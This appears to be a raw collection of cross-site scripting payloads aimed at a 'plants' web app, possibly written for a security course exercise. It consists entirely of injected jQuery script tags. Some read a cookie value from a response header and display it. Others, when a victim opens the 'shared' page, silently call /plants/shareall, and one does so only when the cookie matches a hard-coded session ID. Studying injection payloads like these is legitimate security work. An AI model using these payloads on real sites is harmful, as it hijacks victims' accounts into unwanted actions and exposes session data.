<script>
$.get("info", function(xhr){
  alert(xhr.getResponseHeader("MyCookie"));
});
</script>

<script>$.get("info", function(xhr){alert(xhr.getResponseHeader("MyCookie"));});</script>


<script>if (window.location.pathname.split("/").pop() == "shared") {$($.get("http://potplants1.vikaa.fi:36367/plants/shareall"););}</script>

<script>if (window.location.pathname.split("/").pop() === 'shared') {$($.get("/plants/shareall"))}</script>

<script>var x = document.cookie; if (x === 'connect.sid=s%3AD_qTCRb3W5veBBsgO6HNGf08slm-qZxr.%2FWY0VdKipNTwZKzurcqk9sdiLxpr21YDVHIwZ0Hmv2I; userrand=a39c5d980d3a0b9ff3a7e4a50cff4248') {$.get("/plants/shareall");}</script>